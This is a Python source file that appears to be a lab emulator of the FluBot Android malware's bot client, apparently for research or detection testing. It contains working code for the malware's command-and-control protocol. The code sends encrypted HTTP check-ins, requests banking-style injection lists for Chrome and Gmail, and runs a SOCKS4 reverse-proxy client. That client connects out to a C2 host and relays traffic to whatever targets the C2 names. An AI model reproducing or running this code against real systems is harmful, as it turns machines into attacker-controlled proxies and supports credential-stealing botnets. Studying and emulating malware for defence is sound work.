from __future__ import annotations

import argparse
import concurrent.futures
import http.client
import ipaddress
import socket
import struct
import threading
import time

from flubot_proto import (
    BOT_ID,
    HTTP_PATH,
    decode_http_response,
    encode_http_request,
    lab_rsa_key,
    pack_magic,
    pack_u32,
    recv_exact,
    start_relay_pair,
)


def log(message: str) -> None:
    print(f"[bot] {message}", flush=True)


def parse_dns_server(value: str | None) -> tuple[str, int] | None:
    if not value:
        return None
    if ":" not in value:
        return value, 53
    host, raw_port = value.rsplit(":", 1)
    return host, int(raw_port)


def is_ip_literal(host: str) -> bool:
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


def encode_dns_name(host: str) -> bytes:
    labels = host.rstrip(".").split(".")
    return b"".join(bytes([len(label)]) + label.encode("ascii") for label in labels) + b"\x00"


def skip_dns_name(packet: bytes, offset: int) -> int:
    while True:
        length = packet[offset]
        if length & 0xC0 == 0xC0:
            return offset + 2
        if length == 0:
            return offset + 1
        offset += 1 + length


def resolve_host(host: str, dns_server: str | None) -> str:
    parsed = parse_dns_server(dns_server)
    if parsed is None or is_ip_literal(host):
        return host

    server_host, server_port = parsed
    qid = int(time.time_ns()) & 0xFFFF
    query = (
        struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
        + encode_dns_name(host)
        + struct.pack(">HH", 1, 1)
    )

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as dns_sock:
        dns_sock.settimeout(3)
        dns_sock.sendto(query, (server_host, server_port))
        response, _ = dns_sock.recvfrom(512)

    resp_id, _flags, qdcount, ancount, _nscount, _arcount = struct.unpack(">HHHHHH", response[:12])
    if resp_id != qid:
        raise RuntimeError(f"DNS response id mismatch for {host}")

    offset = 12
    for _ in range(qdcount):
        offset = skip_dns_name(response, offset) + 4

    for _ in range(ancount):
        offset = skip_dns_name(response, offset)
        rtype, rclass, _ttl, rdlength = struct.unpack(">HHIH", response[offset : offset + 10])
        offset += 10
        rdata = response[offset : offset + rdlength]
        offset += rdlength
        if rtype == 1 and rclass == 1 and rdlength == 4:
            ip = socket.inet_ntoa(rdata)
            log(f"DNS {host} -> {ip} via {server_host}:{server_port}")
            return ip

    raise RuntimeError(f"DNS A record not found for {host}")


def panel_send(host: str, port: int, payload: str, bot_id: str, dns_server: str | None) -> str:
    public_key = lab_rsa_key().publickey()
    body, session_key = encode_http_request(payload, bot_id, public_key)
    connect_host = resolve_host(host, dns_server)
    host_header = host if port == 80 else f"{host}:{port}"
    conn = http.client.HTTPConnection(connect_host, port, timeout=5)
    try:
        conn.request(
            "POST",
            HTTP_PATH,
            body=body,
            headers={"Content-Length": str(len(body)), "Host": host_header},
        )
        response = conn.getresponse()
        response_body = response.read()
        if response.status != 200:
            raise RuntimeError(f"HTTP {response.status}: {response_body!r}")
        command = decode_http_response(response_body, bot_id, session_key)
        log(f"HTTP {payload!r} -> {command!r} key={session_key}")
        return command
    finally:
        conn.close()


def read_until_nul(sock: socket.socket) -> bytes:
    data = bytearray()
    while True:
        chunk = recv_exact(sock, 1)
        if chunk == b"\x00":
            return bytes(data)
        data += chunk


def proxy_channel(c2_host: str, data_port: int, dns_server: str | None) -> None:
    try:
        connect_host = resolve_host(c2_host, dns_server)
        with socket.create_connection((connect_host, data_port), timeout=10) as c2_sock:
            c2_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            version = recv_exact(c2_sock, 1)[0]
            if version != 4:
                c2_sock.sendall(b"\x5b")
                return

            command = recv_exact(c2_sock, 1)[0]
            if command != 1:
                c2_sock.sendall(b"\x5b")
                return

            dst_port = struct.unpack(">H", recv_exact(c2_sock, 2))[0]
            dst_ip = socket.inet_ntoa(recv_exact(c2_sock, 4))
            user_id = read_until_nul(c2_sock)
            log(f"SOCKS4 CONNECT target={dst_ip}:{dst_port} user={user_id!r}")

            with socket.create_connection((dst_ip, dst_port), timeout=10) as target_sock:
                target_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                c2_sock.sendall(b"\x00\x5a" + b"\x00" * 6)
                log("SOCKS4 success sent: 00 5a 00 00 00 00 00 00")
                start_relay_pair(c2_sock, target_sock, log)
    except Exception as exc:
        log(f"proxy channel failed: {exc}")


def run_socks_client(c2_host: str, control_port: int, bot_id: str, dns_server: str | None) -> None:
    connect_host = resolve_host(c2_host, dns_server)
    with socket.create_connection((connect_host, control_port), timeout=10) as control:
        control.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        control.sendall(pack_magic())
        control.sendall(pack_u32(len(bot_id)))
        control.sendall(bot_id.encode("utf-8"))
        log(f"control hello sent magic=181030 bot_len={len(bot_id)} bot_id={bot_id}")

        while True:
            raw = control.recv(2)
            if not raw:
                return
            if len(raw) < 2:
                raw += recv_exact(control, 2 - len(raw))
            data_port = struct.unpack(">H", raw)[0]
            log(f"received data_port={data_port}")
            if data_port > 0:
                threading.Thread(target=proxy_channel, args=(c2_host, data_port, dns_server), daemon=True).start()


def parse_socks_command(command: str) -> tuple[str, int]:
    if not command.startswith("SOCKS,"):
        raise ValueError(f"not a SOCKS command: {command!r}")
    host_port = command.split(",", 1)[1]
    host, raw_port = host_port.split(":", 1)
    return host, int(raw_port)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="FluBot-like bot emulator")
    parser.add_argument("--c2-host", default="127.0.0.1")
    parser.add_argument("--http-port", type=int, default=80)
    parser.add_argument("--bot-id", default=BOT_ID)
    parser.add_argument("--android-version", default="11")
    parser.add_argument("--manufacturer", default="Google")
    parser.add_argument("--model", default="Pixel")
    parser.add_argument("--lang", default="en")
    parser.add_argument("--operator", default="lab")
    parser.add_argument("--dns-server", default=None, help="Optional DNS server host[:port] used before TCP connects")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    panel_send(args.c2_host, args.http_port, "PREPING,", args.bot_id, args.dns_server)
    injects_payload = "GET_INJECTS_LIST,com.android.chrome,com.google.android.gm"
    ping = (
        f"PING,3.1,{args.android_version},{args.manufacturer},"
        f"{args.model},{args.lang},1,{args.operator}"
    )

    # Bot.GetInjectsServer() starts the injection-list worker before
    # Bot.ProcessCommands() enters its PING loop. Preserve that concurrency
    # while waiting for both selected lab exchanges to finish cleanly.
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=1,
        thread_name_prefix="flubot-injects",
    ) as executor:
        injects_future = executor.submit(
            panel_send,
            args.c2_host,
            args.http_port,
            injects_payload,
            args.bot_id,
            args.dns_server,
        )
        command = panel_send(args.c2_host, args.http_port, ping, args.bot_id, args.dns_server)
        injects = injects_future.result(timeout=10)
        log(f"injection list received: {injects!r}")

    c2_host, control_port = parse_socks_command(command)
    time.sleep(0.2)
    run_socks_client(c2_host, control_port, args.bot_id, args.dns_server)


if __name__ == "__main__":
    main()
